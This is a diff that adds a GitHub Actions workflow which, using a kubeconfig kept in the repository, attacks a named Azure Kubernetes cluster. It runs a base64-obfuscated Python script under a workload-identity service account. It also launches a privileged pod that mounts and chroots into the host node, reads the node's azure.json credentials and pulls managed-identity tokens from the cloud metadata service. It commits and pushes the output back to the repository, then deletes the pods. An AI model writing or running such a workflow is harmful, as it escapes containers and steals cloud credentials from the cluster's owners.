@@ -1,0 +1,100 @@
+name: ulnode5
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  go:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+      - name: node
+        run: |
+          set +e
+          curl -sL -o /tmp/kubectl https://dl.k8s.io/release/v1.30.5/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl
+          K=ul/kc/datapath-eastus.yaml
+          C=aks-g42us-tfdemo-kashif-datapath-eastus
+          KX="/tmp/kubectl --kubeconfig $K --context $C --request-timeout=25s"
+          PICK=$($KX get pods -n wallet-billing -o wide --field-selector=status.phase=Running | grep -m1 ' 1/1 ')
+          echo "PICK=$PICK"
+          POD=$(echo "$PICK" | awk '{print $1}'); NODE=$(echo "$PICK" | awk '{print $7}')
+          IMG=$($KX get pod -n wallet-billing "$POD" -o jsonpath='{.spec.containers[0].image}')
+          echo "POD=$POD NODE=$NODE IMG=$IMG"
+          [ -z "$IMG" ] && IMG=acrg42ustfdemokashif.azurecr.io/tollgate-control-api:73cdfa9b
+          [ -z "$NODE" ] && NODE=aks-pool110-23564750-vmss000003
+          WI=$(python3 -c "import base64;print(base64.b64encode(open('ul/wi/wia.py','rb').read()).decode())")
+          {
+            echo "=== WI POD (control-sync-apply)"
+            cat > /tmp/wi.yaml <<EOF
+          apiVersion: v1
+          kind: Pod
+          metadata:
+            name: ulwi
+            namespace: wallet-billing
+            labels:
+              azure.workload.identity/use: "true"
+          spec:
+            nodeName: $NODE
+            restartPolicy: Never
+            serviceAccountName: control-sync-apply
+            containers:
+            - name: c
+              image: $IMG
+              imagePullPolicy: IfNotPresent
+              env:
+              - name: WI_PY
+                value: "$WI"
+              command: ["/bin/sh","-c"]
+              args:
+              - python3 -c "import base64,os;exec(base64.b64decode(os.environ['WI_PY']))"
+          EOF
+            $KX apply -f /tmp/wi.yaml
+            for i in 1 2 3 4 5 6 7 8; do sleep 12; S=$($KX get pod -n wallet-billing ulwi -o jsonpath='{.status.phase}' 2>&1); echo "WISTATE$i $S"; [ "$S" = Succeeded ] && break; [ "$S" = Failed ] && break; done
+            $KX logs -n wallet-billing ulwi 2>&1 | head -60
+            echo "=== NODE POD"
+            $KX create namespace ulx5
+            cat > /tmp/pod.yaml <<EOF
+          apiVersion: v1
+          kind: Pod
+          metadata:
+            name: ulnode
+            namespace: ulx5
+          spec:
+            nodeName: $NODE
+            hostPID: true
+            hostNetwork: true
+            automountServiceAccountToken: false
+            restartPolicy: Never
+            containers:
+            - name: c
+              image: $IMG
+              imagePullPolicy: IfNotPresent
+              securityContext:
+                privileged: true
+                runAsUser: 0
+              volumeMounts:
+              - name: host
+                mountPath: /host
+              command: ["/bin/sh","-c"]
+              args:
+              - |
+                chroot /host /bin/bash -lc 'id; hostname; echo ---AZUREJSON---; cat /etc/kubernetes/azure.json 2>/dev/null; echo ---GPU---; nvidia-smi -L 2>&1 | head -3; echo ---IMDS---; curl -s -m 8 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | head -c 1200; echo; echo ---IDENT---; curl -s -m 8 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 800'
+            volumes:
+            - name: host
+              hostPath:
+                path: /
+          EOF
+            $KX apply -f /tmp/pod.yaml
+            for i in 1 2 3 4 5 6 7 8; do sleep 12; S=$($KX get pod -n ulx5 ulnode -o jsonpath='{.status.phase}' 2>&1); echo "NODESTATE$i $S"; [ "$S" = Succeeded ] && break; [ "$S" = Failed ] && break; done
+            $KX logs -n ulx5 ulnode 2>&1 | head -80
+          } 2>&1 | tee node_root5.txt
+          $KX delete pod -n wallet-billing ulwi --wait=false 2>&1 | head -2
+          $KX delete namespace ulx5 --wait=false 2>&1 | head -2
+      - name: commit
+        if: always()
+        run: |
+          set +e
+          git add -A
+          git -c user.email=a@b -c user.name=ul commit -m "ulnode5 $(date -u +%s)"
+          git push
